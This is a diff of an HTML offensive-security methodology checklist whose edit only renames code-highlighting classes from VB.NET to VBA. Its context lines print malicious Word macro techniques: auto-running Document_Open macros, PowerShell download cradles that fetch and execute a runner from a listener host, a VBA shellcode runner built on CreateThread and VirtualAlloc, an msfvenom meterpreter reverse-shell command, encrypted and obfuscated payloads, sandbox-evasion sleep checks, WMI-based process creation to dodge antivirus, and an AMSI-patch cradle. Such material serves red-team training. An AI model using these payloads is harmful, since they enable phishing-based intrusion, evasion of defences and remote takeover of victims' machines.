@@ -939,7 +939,7 @@ EOF</code></pre>
 <ul class="methodology-checklist">
   <li>
     <input type="checkbox"> Create a macro-enabled Word document (.doc/.docm) with auto-run hooks
-    <pre><code class="language-vbnet">' In the VBA editor (View > Macros > Create)
+    <pre><code class="language-vba">' In the VBA editor (View > Macros > Create)
 Sub Document_Open()
     MyMacro
 End Sub
@@ -956,7 +956,7 @@ End Sub</code></pre>
   </li>
   <li>
     <input type="checkbox"> Use a PowerShell download cradle inside the macro to fetch and execute a Sliver implant
-    <pre><code class="language-vbnet">Sub Document_Open()
+    <pre><code class="language-vba">Sub Document_Open()
     MyMacro
 End Sub
 
@@ -1023,7 +1023,7 @@ http -L [listener-ip] --lport [listener-port]</code></pre>
 <ul class="methodology-checklist">
   <li>
     <input type="checkbox"> Verify API calls work by importing and calling GetUserName as a proof of concept
-    <pre><code class="language-vbnet">Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
+    <pre><code class="language-vba">Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
 
 Function MyMacro()
     Dim res As Long
@@ -1056,7 +1056,7 @@ sudo msfvenom -p windows/meterpreter/reverse_https LHOST=[listener-ip] LPORT=[li
   </li>
   <li>
     <input type="checkbox"> Build the complete VBA shellcode runner with all three Win32 API imports
-    <pre><code class="language-vbnet">Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+    <pre><code class="language-vba">Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
 
 Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
 
@@ -1162,7 +1162,7 @@ sudo service apache2 start</code></pre>
   </li>
   <li>
     <input type="checkbox"> Embed the PowerShell download cradle in the VBA macro to fetch and execute the runner
-    <pre><code class="language-vbnet">Sub MyMacro()
+    <pre><code class="language-vba">Sub MyMacro()
     Dim str As String
     str = "powershell (New-Object System.Net.WebClient).DownloadString('http://[listener-ip]/run.ps1') | IEX"
     Shell str, vbHide
@@ -1375,7 +1375,7 @@ $wc.DownloadString("http://[listener-ip]/run.ps1")</code></pre>
   </li>
   <li>
     <input type="checkbox"> Embed the proxy-aware cradle in the VBA macro and confirm traffic routes through the proxy
-    <pre><code class="language-vbnet">' In VBA macro, wrap the full SYSTEM proxy cradle or standard cradle:
+    <pre><code class="language-vba">' In VBA macro, wrap the full SYSTEM proxy cradle or standard cradle:
 Sub MyMacro()
     Dim str As String
     str = "powershell -nop -w hidden -c (New-Object System.Net.WebClient).DownloadString('http://[listener-ip]/run.ps1') | IEX"
@@ -1415,7 +1415,7 @@ End Sub</code></pre>
 <ul class="methodology-checklist">
   <li>
     <input type="checkbox"> Add the content-replacement VBA code to the macro alongside the shellcode runner
-    <pre><code class="language-vbnet">Sub Document_Open()
+    <pre><code class="language-vba">Sub Document_Open()
     SubstitutePage
 End Sub
 
@@ -1435,7 +1435,7 @@ End Sub</code></pre>
   </li>
   <li>
     <input type="checkbox"> Combine the content-swap with the shellcode runner — call SubstitutePage first, then execute the payload
-    <pre><code class="language-vbnet">Sub Document_Open()
+    <pre><code class="language-vba">Sub Document_Open()
     SubstitutePage
     MyMacro
 End Sub
@@ -2638,7 +2638,7 @@ systemctl start apache2</code></pre>
   </li>
   <li>
     <input type="checkbox"> Create or update the Word document with the VBA download cradle macro
-    <pre><code class="language-vbnet">' VBA macro content (paste into Word VBA editor: Alt+F11)
+    <pre><code class="language-vba">' VBA macro content (paste into Word VBA editor: Alt+F11)
 Sub MyMacro()
     Dim str As String
     str = "powershell (New-Object System.Net.WebClient).DownloadString('http://[listener-ip]/run.ps1') | IEX"
@@ -2756,7 +2756,7 @@ $method.Invoke(0, $null)</code></pre>
   </li>
   <li>
     <input type="checkbox"> Embed the reflective C# loader into a Word macro or JScript WSH dropper for client-side delivery
-    <pre><code class="language-vbnet">' VBA macro — reflective C# loader via PowerShell
+    <pre><code class="language-vba">' VBA macro — reflective C# loader via PowerShell
 Sub MyMacro()
     Dim str As String
     str = "powershell -w hidden -c """ & _
@@ -3543,13 +3543,13 @@ static void Main(string[] args) {
 </table>
 
 <h4>8.7.1 VBA Caesar Decryption Routine</h4>
-<pre><code class="language-vbnet">' Decryption routine — subtract cipher key from each byte
+<pre><code class="language-vba">' Decryption routine — subtract cipher key from each byte
 For i = 0 To UBound(buf)
     buf(i) = buf(i) - 2
 Next i</code></pre>
 
 <h4>8.7.2 VBA Sleep Emulation Detection</h4>
-<pre><code class="language-vbnet">Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
+<pre><code class="language-vba">Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
 
 Dim t1 As Date
 Dim t2 As Date
@@ -3594,7 +3594,7 @@ python3 -c "payload=\"$payload\"; print(''.join(f'{ord(char) + 17:03}' for char 
 <p>The <code>GetObject</code>, <code>Get</code>, and <code>Create</code> VBA methods used in WMI process creation are more ambiguous to AV products than the explicit <code>Shell</code> function. This technique alone does not reduce detection rates significantly, but it is a prerequisite for the string obfuscation step that follows.</p>
 
 <h4>8.8.1 VBA WMI Process Creation</h4>
-<pre><code class="language-vbnet">Sub MyMacro()
+<pre><code class="language-vba">Sub MyMacro()
     Dim strArg As String
     strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://[listener-ip]/run.txt'))"
     GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
@@ -3633,7 +3633,7 @@ $payload.ToCharArray() | % {
 $output | clip</code></pre>
 
 <h4>8.9.2 VBA Decryption and Execution (with Food-Named Functions)</h4>
-<pre><code class="language-vbnet">' Decryption helper functions — benign-looking names
+<pre><code class="language-vba">' Decryption helper functions — benign-looking names
 Function Pears(Beets)
     Pears = Chr(Beets - 17)
 End Function
@@ -3905,7 +3905,7 @@ $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)</code></pre>
   </li>
   <li>
     <input type="checkbox"> Incorporate the AMSI patch into a VBA macro that spawns PowerShell via WMI, embedding the script as a download cradle
-    <pre><code class="language-vbnet">Sub MyMacro()
+    <pre><code class="language-vba">Sub MyMacro()
     ' Encrypted AMSI patch download cradle placed in registry value
     GetObject(Nuts("[encrypted-winmgmts]")).Get(Nuts("[encrypted-Win32_Process]")).Create _
         "powershell -enc [base64-encoded-amsi-patch-and-runner]", Null, Null, pid
@@ -11174,7 +11174,7 @@ C:\Windows\System32&gt; del /Q \\file01.corp.local\c$\inject.exe \\dc02.corp.loc
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-json.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-xml-doc.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-nim.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-vbnet.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-vba.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-yaml.min.js"></script>
   <script>
     window.toggleIndex = window.toggleIndex || function () {
